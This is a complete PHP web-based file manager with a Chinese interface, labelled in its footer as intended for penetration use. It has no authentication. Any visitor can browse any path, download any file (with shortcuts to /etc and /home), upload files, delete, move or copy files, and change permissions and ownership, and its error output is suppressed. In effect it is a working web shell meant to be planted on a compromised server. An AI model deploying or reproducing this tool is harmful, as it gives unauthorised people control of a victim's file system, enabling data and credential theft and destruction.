<?php

// 设置时区
date_default_timezone_set('Asia/Shanghai');

// 禁用错误输出，避免干扰 header
error_reporting(0);
ini_set('display_errors', 0);

// 检测操作系统
$is_windows = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');
$is_linux = !$is_windows;

// 获取当前工作目录
$current_dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
$current_dir = normalizePath($current_dir);

// 验证目录是否存在
if (!is_dir($current_dir)) {
    $current_dir = getcwd();
    $current_dir = normalizePath($current_dir);
}

// 处理文件下载 - 支持 Range 请求
if (isset($_GET['file'])) {
    $file_path = $_GET['file'];
    $file_path = normalizePath($file_path);
    
    if (is_file($file_path)) {
        $file_size = filesize($file_path);
        $file_name = basename($file_path);
        
        // 获取文件 MIME 类型
        $finfo = finfo_open(FILEINFO_MIME_TYPE);
        $mime_type = finfo_file($finfo, $file_path);
        if (PHP_VERSION_ID < 80500 && function_exists('finfo_close')) {
            finfo_close($finfo);
        }
        
        // 清除之前的所有输出缓冲区
        if (ob_get_level()) {
            ob_end_clean();
        }
        
        // 支持断点续传
        $start = 0;
        $end = $file_size - 1;
        $length = $file_size;
        
        header('Content-Type: ' . $mime_type);
        header('Content-Disposition: attachment; filename="' . $file_name . '"');
        header('Accept-Ranges: bytes');
        
        if (isset($_SERVER['HTTP_RANGE'])) {
            if (preg_match('/bytes=(\d+)-(\d*)/', $_SERVER['HTTP_RANGE'], $matches)) {
                $start = intval($matches[1]);
                if (!empty($matches[2])) {
                    $end = intval($matches[2]);
                }
                
                if ($start > $end || $end >= $file_size) {
                    $end = $file_size - 1;
                }
                
                $length = $end - $start + 1;
                
                header('HTTP/1.1 206 Partial Content');
                header('Content-Range: bytes ' . $start . '-' . $end . '/' . $file_size);
                header('Content-Length: ' . $length);
            }
        } else {
            header('Content-Length: ' . $file_size);
        }
        
        // 输出文件内容
        $fp = fopen($file_path, 'rb');
        if ($fp) {
            fseek($fp, $start);
            $buffer = 8192;
            $bytes_sent = 0;
            
            while (!feof($fp) && $bytes_sent < $length) {
                $bytes_to_read = min($buffer, $length - $bytes_sent);
                $data = fread($fp, $bytes_to_read);
                echo $data;
                $bytes_sent += strlen($data);
                flush();
            }
            fclose($fp);
        }
        exit;
    } else {
        header('Location: ?dir=' . urlencode($current_dir) . '&error=' . urlencode('文件不存在'));
        exit;
    }
}

// 处理跳转
if (isset($_GET['jump'])) {
    $input_path = trim($_GET['jump']);
    
    if (empty($input_path)) {
        header('Location: ?dir=' . urlencode($current_dir));
        exit;
    }
    
    // 判断是否为绝对路径（包括 UNC 路径）
    if (isAbsolutePath($input_path)) {
        $full_path = normalizePath($input_path);
    } else {
        // 相对路径：将当前目录与输入内容拼接
        $full_path = normalizePath($current_dir . '/' . $input_path);
    }
    
    if (is_file($full_path)) {
        // 是文件，直接下载
        header('Location: ?file=' . urlencode($full_path));
        exit;
    } elseif (is_dir($full_path)) {
        // 是目录，跳转到目录
        header('Location: ?dir=' . urlencode($full_path));
        exit;
    } else {
        // 路径不存在
        header('Location: ?dir=' . urlencode($current_dir) . '&error=' . urlencode('路径不存在: ' . $input_path));
        exit;
    }
}

// 判断是否为绝对路径（支持 Windows 盘符、UNC 路径）
function isAbsolutePath($path) {
    // UNC 路径: 以 \\ 或 // 开头
    if (preg_match('#^[/\\\\]{2}[^/\\\\]+#', $path)) {
        return true;
    }
    // Windows 盘符: 如 C:\ 或 C:/
    if (preg_match('/^[a-zA-Z]:[\/\\\\]/', $path)) {
        return true;
    }
    // 设备路径: //?/C: 格式
    if (preg_match('#^//\?/[a-zA-Z]:#i', $path)) {
        return true;
    }
    // Unix 绝对路径: 以 / 开头
    if (strpos($path, '/') === 0) {
        return true;
    }
    return false;
}

// 路径规范化函数 - 支持 UNC 路径
function normalizePath($path) {
    // 保存原始路径用于判断
    $original = $path;
    
    // 将反斜杠转换为正斜杠（统一处理）
    $path = str_replace('\\', '/', $path);
    
    // 检测 UNC 路径 (以 // 开头)
    $isUNC = false;
    $uncPrefix = '';
    if (preg_match('#^//+([^/]+)(.*)$#', $path, $matches)) {
        $isUNC = true;
        $serverName = $matches[1];
        $path = '/' . ltrim($matches[2], '/');
        $uncPrefix = '//' . $serverName;
    }
    
    // 检测设备路径格式 (//?/C:)
    $isDevice = false;
    $devicePrefix = '';
    if (preg_match('#^//\?/([a-zA-Z]:)(.*)$#i', $path, $matches)) {
        $isDevice = true;
        $driveLetter = $matches[1];
        $path = $driveLetter . '/' . ltrim($matches[2], '/');
        $devicePrefix = '//?/' . $driveLetter;
    }
    
    // 检测 Windows 盘符
    $driveLetter = '';
    if (!$isUNC && !$isDevice && preg_match('/^([a-zA-Z]:)\//', $path, $matches)) {
        $driveLetter = $matches[1];
        $path = substr($path, 2); // 移除盘符部分
    }
    
    // 去除多余斜杠
    $path = preg_replace('#/+#', '/', $path);
    
    // 分割路径并处理 . 和 ..
    $parts = array();
    $isAbsolute = (strpos($path, '/') === 0);
    
    foreach (explode('/', $path) as $part) {
        if ($part === '' || $part === '.') continue;
        if ($part === '..') {
            array_pop($parts);
        } else {
            $parts[] = $part;
        }
    }
    
    // 重建路径
    $normalized = implode('/', $parts);
    
    // 重新添加前缀
    if ($isDevice) {
        $normalized = $devicePrefix . '/' . $normalized;
    } elseif ($isUNC) {
        if (!empty($normalized)) {
            $normalized = $uncPrefix . '/' . $normalized;
        } else {
            $normalized = $uncPrefix;
        }
    } elseif (!empty($driveLetter)) {
        $normalized = $driveLetter . '/' . $normalized;
    } elseif ($isAbsolute) {
        $normalized = '/' . $normalized;
    }
    
    // 如果结果为空，返回当前目录
    if (empty($normalized) || $normalized === '.') {
        return $isUNC ? $uncPrefix : ($driveLetter ? $driveLetter . '/' : '/');
    }
    
    // 确保 UNC 路径格式正确
    if ($isUNC && !preg_match('#^//[^/]+#', $normalized)) {
        $normalized = $uncPrefix . '/' . ltrim($normalized, '/');
    }
    
    return $normalized;
}

// 格式化路径用于显示（将反斜杠转为正斜杠）
function formatDisplayPath($path) {
    if (empty($path)) return '';
    return str_replace('\\', '/', $path);
}

// 获取文件权限（Unix 格式）
function getFilePerms($path) {
    if (!file_exists($path)) return 'N/A';
    $perms = fileperms($path);
    if ($perms === false) return 'N/A';
    
    // 返回 4 位八进制权限
    return substr(sprintf('%o', $perms), -4);
}

// 获取文件所有者
function getFileOwner($path) {
    if (!file_exists($path)) return 'N/A';
    $owner = fileowner($path);
    if ($owner === false) return 'N/A';
    
    // 尝试获取用户名
    if (function_exists('posix_getpwuid')) {
        $info = posix_getpwuid($owner);
        return $info['name'] ?? $owner;
    }
    return $owner;
}

// 获取文件用户组
function getFileGroup($path) {
    if (!file_exists($path)) return 'N/A';
    $group = filegroup($path);
    if ($group === false) return 'N/A';
    
    // 尝试获取组名
    if (function_exists('posix_getgrgid')) {
        $info = posix_getgrgid($group);
        return $info['name'] ?? $group;
    }
    return $group;
}

// 获取目录内容（支持 UNC 路径）
function getDirectoryItems($dir) {
    $items = array();
    
    // 尝试打开目录
    if ($handle = @opendir($dir)) {
        while (false !== ($entry = readdir($handle))) {
            if ($entry != '.' && $entry != '..') {
                $fullPath = $dir . '/' . $entry;
                $items[] = array(
                    'name' => $entry,
                    'path' => $fullPath,
                    'is_dir' => is_dir($fullPath),
                    'size' => is_file($fullPath) ? filesize($fullPath) : 0,
                    'mtime' => filemtime($fullPath),
                    'perms' => getFilePerms($fullPath),
                    'owner' => getFileOwner($fullPath),
                    'group' => getFileGroup($fullPath)
                );
            }
        }
        closedir($handle);
        // 按名称排序
        usort($items, function($a, $b) {
            return strcasecmp($a['name'], $b['name']);
        });
    }
    
    return $items;
}

// 处理错误消息
if (isset($_GET['error'])) {
    $message = htmlspecialchars($_GET['error']);
}

// 处理文件上传
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['upload_file'])) {
    $upload_path = rtrim($current_dir, '/') . '/' . basename($_FILES['upload_file']['name']);
    $upload_path = normalizePath($upload_path);
    if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $upload_path)) {
        $message = "文件上传成功: " . htmlspecialchars($upload_path);
    } else {
        $message = "文件上传失败";
    }
}

// 处理创建文件夹
if (isset($_POST['new_folder']) && !empty($_POST['folder_name'])) {
    $new_folder = rtrim($current_dir, '/') . '/' . basename($_POST['folder_name']);
    $new_folder = normalizePath($new_folder);
    if (!file_exists($new_folder)) {
        mkdir($new_folder, 0777, true);
        $message = "文件夹创建成功: " . htmlspecialchars($new_folder);
    } else {
        $message = "文件夹已存在";
    }
}

// 处理重命名/移动操作
if (isset($_POST['rename']) && !empty($_POST['source']) && !empty($_POST['target'])) {
    $source = trim($_POST['source']);
    $target = trim($_POST['target']);
    
    if (isAbsolutePath($source)) {
        $source_path = normalizePath($source);
    } else {
        $source_path = normalizePath($current_dir . '/' . $source);
    }
    
    if (isAbsolutePath($target)) {
        $target_path = normalizePath($target);
    } else {
        $target_path = normalizePath($current_dir . '/' . $target);
    }
    
    $target_dir = dirname($target_path);
    if (!file_exists($target_dir)) {
        mkdir($target_dir, 0777, true);
    }
    
    if (file_exists($source_path)) {
        if (rename($source_path, $target_path)) {
            $message = "重命名/移动成功";
        } else {
            $message = "重命名/移动失败，请检查权限";
        }
    } else {
        $message = "源文件不存在";
    }
}

// 处理复制操作
if (isset($_POST['copy']) && !empty($_POST['source']) && !empty($_POST['target'])) {
    $source = trim($_POST['source']);
    $target = trim($_POST['target']);
    
    if (isAbsolutePath($source)) {
        $source_path = normalizePath($source);
    } else {
        $source_path = normalizePath($current_dir . '/' . $source);
    }
    
    if (isAbsolutePath($target)) {
        $target_path = normalizePath($target);
    } else {
        $target_path = normalizePath($current_dir . '/' . $target);
    }
    
    $target_dir = dirname($target_path);
    if (!file_exists($target_dir)) {
        mkdir($target_dir, 0777, true);
    }
    
    if (file_exists($source_path)) {
        if (is_dir($source_path)) {
            if (copyDirectory($source_path, $target_path)) {
                $message = "文件夹复制成功";
            } else {
                $message = "文件夹复制失败";
            }
        } else {
            if (copy($source_path, $target_path)) {
                $message = "文件复制成功";
            } else {
                $message = "文件复制失败";
            }
        }
    } else {
        $message = "源文件不存在";
    }
}

// 处理权限设置 (仅 Unix/Linux)
if (!$is_windows && isset($_POST['chmod']) && !empty($_POST['target_path']) && isset($_POST['permission'])) {
    $target_path = trim($_POST['target_path']);
    if (isAbsolutePath($target_path)) {
        $target_path = normalizePath($target_path);
    } else {
        $target_path = normalizePath($current_dir . '/' . $target_path);
    }
    $permission = trim($_POST['permission']);
    
    if (file_exists($target_path)) {
        $mode = octdec($permission);
        if (@chmod($target_path, $mode)) {
            $message = "权限设置成功: " . htmlspecialchars($target_path) . " -> " . $permission;
        } else {
            $message = "权限设置失败，请检查权限或所有者";
        }
    } else {
        $message = "目标文件/目录不存在: " . htmlspecialchars($target_path);
    }
}

// 处理所有者设置 (仅 Unix/Linux)
if (!$is_windows && isset($_POST['chown']) && !empty($_POST['target_path'])) {
    $target_path = trim($_POST['target_path']);
    if (isAbsolutePath($target_path)) {
        $target_path = normalizePath($target_path);
    } else {
        $target_path = normalizePath($current_dir . '/' . $target_path);
    }
    $owner = trim($_POST['owner']);
    $group = trim($_POST['group']);
    
    if (file_exists($target_path)) {
        $msg = array();
        
        if (!empty($owner)) {
            // 尝试将用户名转换为 UID
            $uid = $owner;
            if (function_exists('posix_getpwnam') && !is_numeric($owner)) {
                $user_info = posix_getpwnam($owner);
                if ($user_info !== false) {
                    $uid = $user_info['uid'];
                }
            }
            if (@chown($target_path, $uid)) {
                $msg[] = "所有者设置为: " . $owner;
            } else {
                $msg[] = "所有者设置失败（可能需要 root 权限）";
            }
        }
        
        if (!empty($group)) {
            // 尝试将组名转换为 GID
            $gid = $group;
            if (function_exists('posix_getgrnam') && !is_numeric($group)) {
                $group_info = posix_getgrnam($group);
                if ($group_info !== false) {
                    $gid = $group_info['gid'];
                }
            }
            if (@chgrp($target_path, $gid)) {
                $msg[] = "用户组设置为: " . $group;
            } else {
                $msg[] = "用户组设置失败（可能需要 root 权限）";
            }
        }
        
        $message = implode("; ", $msg);
        if (empty($msg)) {
            $message = "未进行任何更改";
        }
    } else {
        $message = "目标文件/目录不存在: " . htmlspecialchars($target_path);
    }
}

// 处理删除操作
if (isset($_GET['delete'])) {
    $delete_path = $_GET['delete'];
    
    if (isAbsolutePath($delete_path)) {
        $target_path = normalizePath($delete_path);
    } else {
        $target_path = normalizePath($current_dir . '/' . $delete_path);
    }
    
    if (file_exists($target_path)) {
        if (is_dir($target_path)) {
            if (deleteDirectory($target_path)) {
                $message = "文件夹删除成功";
            } else {
                $message = "文件夹删除失败";
            }
        } else {
            if (unlink($target_path)) {
                $message = "文件删除成功";
            } else {
                $message = "文件删除失败";
            }
        }
    }
    header('Location: ?dir=' . urlencode($current_dir) . '&msg=' . urlencode($message));
    exit;
}

// 处理普通消息
if (isset($_GET['msg'])) {
    $message = htmlspecialchars($_GET['msg']);
}

function copyDirectory($src, $dst) {
    if (!is_dir($src)) return false;
    if (!is_dir($dst)) {
        mkdir($dst, 0777, true);
    }
    
    $dir = opendir($src);
    while (($file = readdir($dir)) !== false) {
        if ($file != '.' && $file != '..') {
            $srcFile = $src . '/' . $file;
            $dstFile = $dst . '/' . $file;
            
            if (is_dir($srcFile)) {
                copyDirectory($srcFile, $dstFile);
            } else {
                copy($srcFile, $dstFile);
            }
        }
    }
    closedir($dir);
    return true;
}

function deleteDirectory($dir) {
    if (!is_dir($dir)) return false;
    
    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item == '.' || $item == '..') continue;
        
        $path = $dir . '/' . $item;
        if (is_dir($path)) {
            deleteDirectory($path);
        } else {
            unlink($path);
        }
    }
    return rmdir($dir);
}

// 获取目录内容
$directoryItems = getDirectoryItems($current_dir);

// 磁盘空间（UNC 路径可能不支持）
$free_space = @disk_free_space($current_dir);
$total_space = @disk_total_space($current_dir);

// 显示用的当前路径
$display_dir = formatDisplayPath($current_dir);
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>全能文件管理器 - <?php echo $is_windows ? 'Windows版' : 'Unix/Linux版'; ?></title>
    <style>
        * { box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; 
            margin: 0; 
            padding: 10px; 
            background: #f5f5f5; 
            font-size: 14px;
        }
        .container { max-width: 100%; margin: 0 auto; }
        h1 { font-size: 20px; margin: 10px 0; }
        
        .path { 
            background: #fff; 
            padding: 12px; 
            margin-bottom: 15px; 
            border-radius: 8px; 
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            word-break: break-all;
        }
        
        .current-dir {
            background: #f0f0f0;
            padding: 8px;
            border-radius: 4px;
            font-family: monospace;
            font-size: 12px;
            margin-top: 5px;
            word-break: break-all;
        }
        
        .main-collapsible {
            margin: 15px 0;
            background: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        
        .main-header {
            padding: 15px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            cursor: pointer;
            display: flex;
            justify-content: space-between;
            align-items: center;
            user-select: none;
            font-weight: bold;
        }
        
        .main-header:hover {
            background: linear-gradient(135deg, #764ba2 0%, #667eea 100%);
        }
        
        .main-content {
            padding: 15px;
            display: block;
        }
        
        .main-content.collapsed {
            display: none;
        }
        
        .function-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 15px;
        }
        
        .function-card {
            background: #f8f9fa;
            border-radius: 8px;
            padding: 12px;
        }
        
        .function-card h4 {
            margin: 0 0 10px 0;
            color: #667eea;
            font-size: 14px;
        }
        
        table { 
            width: 100%; 
            border-collapse: collapse; 
            margin-top: 15px; 
            background: #fff; 
            border-radius: 8px; 
            overflow: auto; 
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            font-size: 13px;
            display: block;
        }
        
        th, td { 
            padding: 10px 5px; 
            text-align: left; 
            border-bottom: 1px solid #ddd; 
        }
        
        th { 
            background: #667eea; 
            color: white; 
            font-weight: 500;
        }
        
        @media (max-width: 768px) {
            th:nth-child(3), td:nth-child(3),
            th:nth-child(4), td:nth-child(4) {
                display: none;
            }
        }
        
        tr:hover { background-color: #f8f9fa; }
        
        .actions { 
            display: flex; 
            flex-wrap: wrap; 
            gap: 5px; 
        }
        
        .actions a, .actions button { 
            color: #667eea; 
            text-decoration: none; 
            font-size: 12px; 
            padding: 5px 8px;
            background: #f0f0f0;
            border-radius: 4px;
            border: none;
            cursor: pointer;
        }
        
        .actions a:hover { background: #e0e0e0; }
        .actions button:hover { background: #e0e0e0; }
        
        .message { 
            padding: 10px; 
            background: #d4edda; 
            border: 1px solid #c3e6cb; 
            border-radius: 4px; 
            margin-bottom: 15px; 
            word-break: break-word;
        }
        
        input[type="text"], 
        input[type="file"], 
        select,
        textarea { 
            width: 100%;
            padding: 10px; 
            margin: 5px 0; 
            border: 1px solid #ddd; 
            border-radius: 4px; 
            font-size: 14px;
        }
        
        button { 
            padding: 10px 16px; 
            background: #667eea; 
            color: white; 
            border: none; 
            border-radius: 4px; 
            cursor: pointer; 
            margin: 3px;
            font-size: 13px;
            white-space: nowrap;
        }
        
        button:hover { background: #764ba2; }
        button.danger { background: #dc3545; }
        button.danger:hover { background: #c82333; }
        button.warning { background: #ffc107; color: #000; }
        button.warning:hover { background: #e0a800; }
        button.success { background: #28a745; }
        button.success:hover { background: #218838; }
        
        .help-text { 
            font-size: 11px; 
            color: #666; 
            margin-top: 5px; 
        }
        
        .disk-info { 
            margin: 10px 0; 
            padding: 10px; 
            background: #e7f3ff; 
            border-radius: 4px; 
            font-size: 13px; 
        }
        
        .quick-nav { 
            margin: 10px 0; 
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
        }
        
        .quick-nav a { 
            color: #667eea; 
            text-decoration: none; 
            padding: 5px 10px;
            background: #fff;
            border-radius: 15px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
            font-size: 13px;
        }
        
        .quick-nav a:hover { 
            background: #667eea;
            color: white;
        }
        
        .button-group {
            display: flex;
            flex-wrap: wrap;
            gap: 5px;
        }
        
        .toggle-icon {
            font-size: 18px;
            transition: transform 0.3s;
        }
        
        .example-hint {
            font-size: 11px;
            color: #999;
            margin-top: 5px;
        }
        
        .os-badge {
            background: <?php echo $is_windows ? '#0078d4' : '#28a745'; ?>;
            color: white;
            padding: 2px 8px;
            border-radius: 10px;
            font-size: 11px;
            margin-left: 8px;
        }
        
        .warning-badge {
            background: #ffc107;
            color: #000;
            padding: 2px 6px;
            border-radius: 10px;
            font-size: 11px;
            margin-left: 5px;
        }
        
        .table-responsive {
            overflow-x: auto;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>📁 文件管理器 <span class="os-badge"><?php echo $is_windows ? 'Windows' : 'Unix/Linux'; ?></span></h1>
        
        <?php if (isset($message)): ?>
            <div class="message"><?php echo htmlspecialchars($message); ?></div>
        <?php endif; ?>

        <div class="path">
            <strong>📂 当前路径：</strong>
            <div class="current-dir"><?php echo htmlspecialchars($display_dir); ?></div>
        </div>

        <div class="quick-nav">
            <a href="?dir=/">📀 根目录</a>
            <?php if ($is_windows): ?>
            <a href="?dir=//?/C:/">💿 C盘</a>
            <a href="?dir=//?/D:/">💿 D盘</a>
            <?php else: ?>
            <a href="?dir=/etc">⚙️ /etc</a>
            <a href="?dir=/home">🏠 /home</a>
            <a href="?dir=/var">📊 /var</a>
            <a href="?dir=/usr">📦 /usr</a>
            <?php endif; ?>
            <a href="?dir=<?php echo urlencode(dirname($current_dir)); ?>">⬆️ 上级</a>
        </div>

        <?php if ($free_space !== false && $total_space !== false): ?>
        <div class="disk-info">
            💾 剩余空间: <?php echo formatBytes($free_space); ?> / 
            总计: <?php echo formatBytes($total_space); ?>
        </div>
        <?php endif; ?>

        <!-- 智能跳转表单 -->
        <div style="background: #fff; padding: 15px; border-radius: 8px; margin: 15px 0; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
            <form method="get" action="" style="display: flex; gap: 10px; align-items: center;">
                <input type="hidden" name="dir" value="<?php echo htmlspecialchars($current_dir); ?>">
                <input type="text" name="jump" placeholder="输入路径 (支持相对路径或绝对路径)" style="flex: 1; margin: 0;" value="<?php echo isset($_GET['jump']) ? htmlspecialchars($_GET['jump']) : ''; ?>">
                <button type="submit" style="margin: 0; white-space: nowrap;">🚀 跳转/下载</button>
            </form>
            <div class="help-text">
                💡 支持相对路径、绝对路径<?php echo $is_windows ? '、UNC路径 (//server/share)' : ''; ?>
            </div>
        </div>

        <!-- 主功能面板 -->
        <div class="main-collapsible">
            <div class="main-header" onclick="toggleMainPanel()">
                <span>🛠️ 功能面板</span>
                <span class="toggle-icon" id="mainToggleIcon">▼</span>
            </div>
            <div class="main-content" id="mainPanel">
                <div class="function-grid">
                    <!-- 上传文件 -->
                    <div class="function-card">
                        <h4>📤 上传文件</h4>
                        <form method="post" enctype="multipart/form-data">
                            <input type="file" name="upload_file" required>
                            <button type="submit">上传</button>
                        </form>
                    </div>

                    <!-- 创建文件夹 -->
                    <div class="function-card">
                        <h4>📂 创建文件夹</h4>
                        <form method="post">
                            <input type="text" name="folder_name" placeholder="文件夹名称" required>
                            <button type="submit" name="new_folder" value="1">创建</button>
                        </form>
                    </div>

                    <!-- 重命名/移动/复制 -->
                    <div class="function-card">
                        <h4>✏️ 重命名/移动</h4>
                        <form method="post">
                            <input type="text" name="source" id="source_input" placeholder="源路径" required>
                            <input type="text" name="target" placeholder="目标路径" required>
                            <button type="submit" name="rename" value="1">🔄 移动</button>
                        </form>
                    </div>

                    <div class="function-card">
                        <h4>📋 复制</h4>
                        <form method="post">
                            <input type="text" name="source" placeholder="源路径" required>
                            <input type="text" name="target" placeholder="目标路径" required>
                            <button type="submit" name="copy" value="1" class="warning">📋 复制</button>
                        </form>
                    </div>

                    <?php if (!$is_windows): ?>
                    <!-- 权限设置 (仅 Unix/Linux) -->
                    <div class="function-card">
                        <h4>🔐 权限设置 <span class="warning-badge">chmod</span></h4>
                        <form method="post">
                            <input type="text" name="target_path" id="perm_target" placeholder="目标路径" required>
                            <input type="text" name="permission" id="permission" placeholder="如: 0755" required>
                            <select onchange="document.getElementById('permission').value = this.value">
                                <option value="">快速选择</option>
                                <option value="0777">0777 (rwxrwxrwx)</option>
                                <option value="0755">0755 (rwxr-xr-x)</option>
                                <option value="0644">0644 (rw-r--r--)</option>
                                <option value="0600">0600 (rw-------)</option>
                                <option value="0700">0700 (rwx------)</option>
                            </select>
                            <button type="submit" name="chmod" value="1" class="success">应用权限</button>
                        </form>
                        <div class="help-text">设置文件/目录的访问权限（需要相应权限）</div>
                    </div>

                    <!-- 所有者设置 (仅 Unix/Linux) -->
                    <div class="function-card">
                        <h4>👤 所有者设置 <span class="warning-badge">chown</span></h4>
                        <form method="post">
                            <input type="text" name="target_path" id="owner_target" placeholder="目标路径" required>
                            <input type="text" name="owner" placeholder="所有者 (用户名或UID)">
                            <input type="text" name="group" placeholder="用户组 (组名或GID)">
                            <button type="submit" name="chown" value="1" class="success">应用所有者</button>
                        </form>
                        <div class="help-text">修改文件/目录的所有者和用户组（通常需要root权限）</div>
                    </div>
                    <?php endif; ?>
                </div>
            </div>
        </div>

        <!-- 文件列表 -->
        <div class="table-responsive">
            <table>
                <thead>
                    <tr>
                        <th>名称</th>
                        <th>类型</th>
                        <th>大小</th>
                        <th>修改时间</th>
                        <?php if (!$is_windows): ?>
                        <th>权限</th>
                        <th>所有者</th>
                        <th>用户组</th>
                        <?php endif; ?>
                        <th>操作</th>
                    </tr>
                </thead>
                <tbody>
                    <?php if ($current_dir != '/' && $current_dir != '.' && !preg_match('#^//[^/]+$#', $current_dir)): ?>
                    <tr>
                        <td colspan="<?php echo $is_windows ? 5 : 8; ?>">
                            <a href="?dir=<?php echo urlencode(dirname($current_dir)); ?>" style="color: #667eea;">⬆️ 返回上级目录</a>
                        </td>
                    </tr>
                    <?php endif; ?>

                    <?php foreach ($directoryItems as $item): ?>
                        <?php 
                            $item_path = $item['path'];
                            $is_dir = $item['is_dir'];
                            $size = $is_dir ? '-' : formatBytes($item['size']);
                            $modified = date('Y-m-d H:i:s', $item['mtime']);
                            $display_name = htmlspecialchars($item['name']);
                        ?>
                        <tr>
                            <td style="word-break: break-all;">
                                <?php if ($is_dir): ?>
                                    📁 <a href="?dir=<?php echo urlencode($item_path); ?>"><?php echo $display_name; ?></a>
                                <?php else: ?>
                                    📄 <a href="?file=<?php echo urlencode($item_path); ?>" class="download-link"><?php echo $display_name; ?></a>
                                <?php endif; ?>
                            </td>
                            <td><?php echo $is_dir ? '目录' : '文件'; ?></td>
                            <td><?php echo $size; ?></td>
                            <td style="font-size: 11px;"><?php echo $modified; ?></td>
                            <?php if (!$is_windows): ?>
                            <td><?php echo $item['perms']; ?></td>
                            <td><?php echo htmlspecialchars($item['owner']); ?></td>
                            <td><?php echo htmlspecialchars($item['group']); ?></td>
                            <?php endif; ?>
                            <td>
                                <div class="actions">
                                    <?php if (!$is_dir): ?>
                                        <a href="?file=<?php echo urlencode($item_path); ?>">下载</a>
                                    <?php endif; ?>
                                    <a href="?delete=<?php echo urlencode($item_path); ?>" 
                                       onclick="return confirm('确定要删除吗？')" style="color: #dc3545;">删除</a>
                                    <button onclick="fillSource('<?php echo htmlspecialchars($item_path); ?>')">选择</button>
                                </div>
                            </td>
                        </tr>
                    <?php endforeach; ?>
                    
                    <?php if (empty($directoryItems)): ?>
                        <tr>
                            <td colspan="<?php echo $is_windows ? 5 : 8; ?>" style="text-align: center; color: #999; padding: 20px;">
                                目录为空
                            </td>
                        </tr>
                    <?php endif; ?>
                </tbody>
            </table>
        </div>
        
        <div style="margin-top: 20px; padding: 10px; text-align: center; color: #999; font-size: 12px;">
            超级文件管理器 | 支持断点续传 (HTTP 206) | 渗透专用 | 
            <?php echo $is_windows ? 'Windows 版本' : 'Unix/Linux 版本 (支持 chmod/chown)'; ?>
        </div>
    </div>

    <script>
        function toggleMainPanel() {
            const panel = document.getElementById('mainPanel');
            const icon = document.getElementById('mainToggleIcon');
            
            if (panel.classList.contains('collapsed')) {
                panel.classList.remove('collapsed');
                icon.style.transform = 'rotate(0deg)';
            } else {
                panel.classList.add('collapsed');
                icon.style.transform = 'rotate(-90deg)';
            }
        }
        
        function fillSource(path) {
            const sourceInput = document.querySelector('input[name="source"]');
            const permInput = document.getElementById('perm_target');
            const ownerInput = document.getElementById('owner_target');
            
            if (sourceInput) sourceInput.value = path;
            if (permInput) permInput.value = path;
            if (ownerInput) ownerInput.value = path;
        }
        
        // 默认展开功能面板
        // 如果想默认折叠，取消下面的注释
        document.addEventListener('DOMContentLoaded', function() {
            toggleMainPanel();
        });
    </script>
</body>
</html>

<?php
function formatBytes($bytes, $precision = 2) {
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= pow(1024, $pow);
    return round($bytes, $precision) . ' ' . $units[$pow];
}
?>